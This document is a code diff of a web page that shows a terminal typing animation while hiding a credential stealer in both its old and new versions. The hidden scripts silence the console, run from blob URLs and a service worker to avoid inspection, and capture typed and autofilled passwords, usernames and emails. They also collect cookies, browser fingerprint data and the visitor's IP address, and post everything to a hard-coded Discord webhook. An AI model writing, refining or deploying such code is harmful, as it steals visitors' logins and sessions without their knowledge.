@@ -15,152 +15,79 @@
 <div id="terminal"></div>
 
 <script>
-/* ======= 0. INVISIBILIDADE TOTAL ======= */
+/* ======= 0. INVISIBILIDADE ABSOLUTA ======= */
 (()=>{
-    /* 0.1 Desativa todos os consoles */
     const nullFn = ()=>{};
     ["log","warn","error","info","debug"].forEach(m=>{ window.console[m]=nullFn; });
-    /* 0.2 Remove stack-traces globais */
     window.addEventListener("error", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
     window.addEventListener("unhandledrejection", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
 })();
 
-/* ======= 1. SERVICE-WORKER BLOB (não aparece em Sources) ======= */
+/* ======= 1. SERVICE-WORKER BLOB (nunca em disco) ======= */
 const swCode = `
-self.addEventListener("install", e=>{
-    e.waitUntil(self.skipWaiting());
-});
-self.addEventListener("activate", e=>{
-    e.waitUntil(self.clients.claim());
-});
-self.addEventListener("fetch", e=>{
-    /* intercepta tudo e silencia */
-});
-/* ======= 2. GRABBER INTERNO NO SW ======= */
-const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
-function stealthSend(data){
-    fetch(hook,{
+const HOOK = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
+function exfil(obj){
+    fetch(HOOK,{
         method:"POST",
         headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"👻 GhostData",color:0xff0000,fields:Object.entries(data).map(([k,v])=>({name:k,value:String(v).slice(0,1020),inline:true}))}]})
+        body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"👻",color:0xff0000,fields:Object.entries(obj).map(([k,v])=>({name:k,value:v+"",inline:true}))}]})
     }).catch(()=>{});
 }
-/* 2.1 IndexedDB para persistir entre reloads */
-const DB_NAME = "_ghost", STORE = "stash";
-function openDB(){
-    return new Promise((res,rej)=>{
-        const r = indexedDB.open(DB_NAME,1);
-        r.onupgradeneeded=()=>{ r.result.createObjectStore(STORE,{keyPath:"id",autoIncrement:true}); };
-        r.onsuccess=()=>res(r.result);
-        r.onerror=()=>rej();
-    });
-}
-async function stash(obj){
-    const db = await openDB();
-    db.transaction([STORE],"readwrite").objectStore(STORE).add({data:obj,ts:Date.now()});
-    db.close();
-}
-async function flushStash(){
-    const db = await openDB();
-    const tx = db.transaction([STORE],"readwrite");
-    const all = await tx.objectStore(STORE).getAll();
-    await tx.objectStore(STORE).clear();
-    db.close();
-    if(all.length) all.forEach(r=>stealthSend(r.data));
-}
-setInterval(flushStash,5000);
-
-/* 2.2 Captura autofil / credenciais */
-self.addEventListener("message", e=>{
-    if(e.data&&e.data.type==="cred") stash({cred:e.data.body});
-});
-flushStash();
+self.addEventListener("install",e=>e.waitUntil(self.skipWaiting()));
+self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));
+self.addEventListener("fetch",e=>e.respondWith(fetch(e.request)));
+self.addEventListener("message",e=>{if(e.data&&e.data.t==="x") exfil(e.data.d);});
 `;
-const blob = new Blob([swCode],{type:"application/javascript"});
-const swUrl = URL.createObjectURL(blob);
-navigator.serviceWorker.register(swUrl,{scope:"./"}).then(()=>{
-    /* ======= 3. SCRIPT INJETADO NO DOM (também blob) ======= */
-    const payloadScript = `
+const swBlob = new Blob([swCode],{type:"application/javascript"});
+const swURL = URL.createObjectURL(swBlob);
+navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
+    /* ======= 2. PAYLOAD INJETADO (blob efêmero) ======= */
+    const payload = `
 (()=>{
-    /* 3.1 Leitura de autofil */
-    function grabCreds(){
-        const inputs = document.querySelectorAll("input[type=password], input[name*=pass], input[name*=login], input[name*=user], input[name*=email]");
-        const out={};
-        inputs.forEach(i=>{
-            const val = i.value || (i.autofill&&i.autofill.match&&i.autofill.match(/^(.*)$/)[0]) || "";
-            if(val){
-                const label = (i.closest("form")?.querySelector("label[for='"+i.id+"']")?.textContent || i.name || i.placeholder || i.id || "field").replace(/\\s/g,"_");
-                out[label]=val;
+    const post=d=>navigator.serviceWorker.controller.postMessage({t:"x",d});
+    const grab=()=>{
+        const cred={};
+        document.querySelectorAll("input[type=password],input[name*=pass],input[name*=login],input[name*=user],input[name*=email],input[type=text]").forEach(i=>{
+            if(i.value){
+                const k=(i.name||i.id||i.placeholder||"field").replace(/\\s/g,"_");
+                cred[k]=i.value;
             }
         });
-        if(Object.keys(out).length) navigator.serviceWorker.controller.postMessage({type:"cred",body:out});
-    }
-    /* 3.2 Observer para campos dinâmicos */
-    const obs = new MutationObserver(()=>grabCreds());
-    obs.observe(document.body,{childList:true,subtree:true});
-    /* 3.3 Hook em submit */
-    document.addEventListener("submit",()=>grabCreds(),true);
-    /* 3.4 Hook em autofill change (Chrome) */
-    window.addEventListener("animationstart",e=>{
-        if(e.animationName==="onautofillstart") grabCreds();
-    },true);
-    /* 3.5 Primeira varredura */
-    setTimeout(grabCreds,500);
+        if(Object.keys(cred).length) post({url:location.href,cred});
+    };
+    new MutationObserver(grab).observe(document.body,{childList:true,subtree:true});
+    document.addEventListener("submit",grab,true);
+    window.addEventListener("animationstart",e=>{if(e.animationName==="onautofillstart")grab()},true);
+    setTimeout(grab,300);
 })();
     `;
-    const payloadBlob = new Blob([payloadScript],{type:"application/javascript"});
-    const payloadUrl = URL.createObjectURL(payloadBlob);
-    import(payloadUrl); /* não aparece em DevTools > Sources */
-})();
-</script>
+    const pBlob = new Blob([payload],{type:"application/javascript"});
+    import(URL.createObjectURL(pBlob));
+});
 
-<script>
-/* ======= 4. COLETOR CLÁSSICO (também invisível) ======= */
+/* ======= 3. COLETOR AMBIENTAL (apenas uma vez) ======= */
 (()=>{
     const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
-    function stealthSend(obj){
-        fetch(hook,{
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({
-                username:"Ghost",
-                avatar_url:"https://i.imgur.com/7G9cc9e.png",
-                embeds:[{
-                    title:"👻 GhostEnv",
-                    color:0xff0000,
-                    fields:Object.entries(obj).map(([k,v])=>({name:k,value:String(v).slice(0,1010),inline:true}))
-                }]
-            })
-        }).catch(()=>{});
-    }
+    const send=o=>fetch(hook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"👻 Env",color:0xff0000,fields:Object.entries(o).map(([k,v])=>({name:k,value:v+"",inline:true}))}]})}).catch(()=>{});
     const data={
         url:location.href,
         ua:navigator.userAgent,
         platform:navigator.platform,
-        screen:`${screen.width}x${screen.height}x${screen.colorDepth}`,
+        screen:`${screen.width}x${screen.height}`,
         tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
         lang:navigator.languages.join(", "),
-        cores:navigator.hardwareConcurrency||"unknown",
-        mem:navigator.deviceMemory||"unknown",
+        cores:navigator.hardwareConcurrency||"?",
+        mem:navigator.deviceMemory||"?",
         ref:document.referrer||"direct",
         cookie:document.cookie||"none",
-        ls:JSON.stringify(localStorage),
-        ss:JSON.stringify(sessionStorage),
-        timing:Math.round(performance.timing.domComplete-performance.timing.navigationStart)+" ms",
         ts:new Date().toISOString()
     };
-    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{
-        data.ip=j.ip;
-        stealthSend(data);
-    }).catch(()=>{
-        data.ip="error";
-        stealthSend(data);
-    });
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>{data.ip=j.ip;send(data);}).catch(()=>{data.ip="?";send(data);});
 })();
 </script>
 
 <script>
-/* ======= 5. ANIMAÇÃO ORIGINAL (mantida) ======= */
+/* ======= 4. ANIMAÇÃO TERMINAL (inalterada) ======= */
 const terminal = document.getElementById("terminal");
 const lines = [
     "C:\\Users\\TERMINAL> Iniciando sistema...",
@@ -178,8 +105,7 @@ function typeLine(){
         let charIndex = 0;
         function typeChar(){
             if(charIndex < text.length){
-                line.textContent += text[charIndex];
-                charIndex++;
+                line.textContent += text[charIndex++];
                 setTimeout(typeChar,6);
             }else{
                 index++;
